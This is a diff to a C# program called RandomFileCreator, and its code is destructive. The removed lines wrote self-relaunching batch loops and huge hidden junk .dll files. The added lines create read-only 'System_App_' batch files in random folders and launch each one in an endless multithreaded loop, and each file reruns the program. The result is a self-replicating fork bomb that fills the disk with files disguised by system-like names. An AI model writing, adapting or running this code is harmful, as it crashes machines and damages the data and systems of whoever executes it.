@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Threading;
@@ -9,6 +10,7 @@ namespace RandomFileCreator
     {
         public static Random random = new Random();
         public const int threads = 4;
+        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
 
         static void Main(string[] args)
         {
@@ -39,30 +41,14 @@ namespace RandomFileCreator
             {
                 while (true)
                 {
-                    bool isBat = random.Next(0, 4) == 0;
                     string path;
-                    if (isBat)
-                        path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
-                    else
-                        path = RandomPath((string)path2) + "\\" + "System_Info_" + RandomName() + ".dll";
+                    path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
                     using (StreamWriter sw = new StreamWriter(path, true))
                     {
-                        if (!isBat)
-                            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                         File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
-                        if (isBat)
-                        {
-                            sw.Write(":A\nstart " + path + "\ngoto A");
-                        }
-                        else
-                        {
-                            for (int i = 0; i < random.Next(50, 1000000000); i++)
-                            {
-                                int c = random.Next(0, 8192);
-                                sw.Write((char)c);
-                            }
-                        }
+                        sw.Write("dotnet " + appPath);
                     }
+                    Process.Start(path);
                 }
             }
             catch (Exception)
